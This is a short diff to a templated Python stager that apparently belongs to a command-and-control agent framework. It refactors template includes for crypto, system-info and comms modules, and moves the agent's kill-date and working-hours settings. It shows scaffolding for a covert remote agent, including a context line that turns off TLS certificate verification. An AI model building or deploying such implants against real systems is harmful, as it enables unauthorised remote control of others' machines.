@@ -13,25 +13,24 @@ import random
 import string
 import urllib.request
 
-{% include 'common/aes.py' %}
-{% include 'common/aesgcm.py' %}
-{% include 'common/diffiehellman.py' %}
-{% include 'common/get_sysinfo.py' %}
-{% include 'common/mtls.py' %}
-
-REPLACE_COMMS
-
+{% include 'common/aes.py.j2' %}
+{% include 'common/aesgcm.py.j2' %}
+{% include 'common/diffiehellman.py.j2' %}
+{% include 'common/get_sysinfo.py.j2' %}
+{% include 'http/comms.py.j2' %}
+{% include 'common/mtls.py.j2' %}
 
 class Stage:
     def __init__(self):
         self.staging_key = b'{{ staging_key }}'
         self.profile = '{{ profile }}'
         self.server = '{{ host }}'
-        self.kill_date = '{{ kill_date }}'
-        self.working_hours = '{{ working_hours }}'
         self.agent_private_cert_key = {{ agent_private_cert_key }}
         self.agent_public_cert_key = {{ agent_public_cert_key }}
         self.server_public_cert_key = {{ server_public_cert_key }}
+
+        self.kill_date = '{{ kill_date }}'
+        self.working_hours = '{{ working_hours }}'
 
         if self.server.startswith("https"):
             hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None
